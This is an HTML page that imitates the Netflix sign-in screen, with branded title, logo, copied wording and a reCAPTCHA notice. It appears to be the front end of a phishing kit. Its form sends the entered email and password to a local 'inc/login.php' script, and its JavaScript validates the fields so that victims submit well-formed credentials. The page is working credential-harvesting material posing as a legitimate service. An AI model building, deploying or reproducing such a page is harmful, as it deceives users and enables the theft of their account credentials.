<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix</title>
  <link rel="stylesheet" href="style/login.css">
  <link rel="shortcut icon" href="style/favicon.ico">
  <style>
    .error {
      color: #e87c03;
      font-size: 13px;
      margin: -10px 0 10px 0;
      display: none;
      text-align: left;
    }
    .input-error {
      border-bottom: 2px solid #e87c03 !important;
    }
  </style>
</head>
<body>

  <header>
    <div class="logo">NETFLIX</div>
  </header>

  <main>
    <div class="login-box">
      <h1>Enter your info to sign in</h1>
      <p>Or get started with a new account.</p>

      <form action="inc/login.php" method="POST" id="loginForm" novalidate>
        <input
          name="email"
          type="text"
          id="email"
          placeholder="Email or mobile number"
        >
        <div class="error" id="emailError">Please enter a valid email or mobile number.</div>

        <input
          name="Password"
          type="password"
          id="password"
          placeholder="Password"
        >
        <div class="error" id="passwordError">Your password must contain between 4 and 60 characters.</div>

        <button type="submit">Login</button>
      </form>

      <div class="help">
        Get Help <span>⌄</span>
      </div>

      <small>
        This page is protected by Google reCAPTCHA to ensure you're not a bot.
      </small>
    </div>
  </main>

  <script>
    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');

    // Regex for email or mobile number (10-15 digits)
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const mobileRegex = /^[0-9]{10,15}$/;

    function validateEmail() {
      const value = emailInput.value.trim();

      if (value === '') {
        showError(emailInput, emailError, 'Email or mobile number is required.');
        return false;
      }

      if (!emailRegex.test(value) && !mobileRegex.test(value)) {
        showError(emailInput, emailError, 'Please enter a valid email or mobile number.');
        return false;
      }

      clearError(emailInput, emailError);
      return true;
    }

    function validatePassword() {
      const value = passwordInput.value;

      if (value === '') {
        showError(passwordInput, passwordError, 'Password is required.');
        return false;
      }

      if (value.length < 4 || value.length > 60) {
        showError(passwordInput, passwordError, 'Your password must contain between 4 and 60 characters.');
        return false;
      }

      clearError(passwordInput, passwordError);
      return true;
    }

    function showError(input, errorEl, message) {
      input.classList.add('input-error');
      errorEl.textContent = message;
      errorEl.style.display = 'block';
    }

    function clearError(input, errorEl) {
      input.classList.remove('input-error');
      errorEl.style.display = 'none';
    }

    // Live validation on input
    emailInput.addEventListener('input', validateEmail);
    passwordInput.addEventListener('input', validatePassword);

    // Validate on submit
    form.addEventListener('submit', function (e) {
      const isEmailValid = validateEmail();
      const isPasswordValid = validatePassword();

      if (!isEmailValid || !isPasswordValid) {
        e.preventDefault(); // Stop form submission
      }
    });
  </script>

</body>
</html>
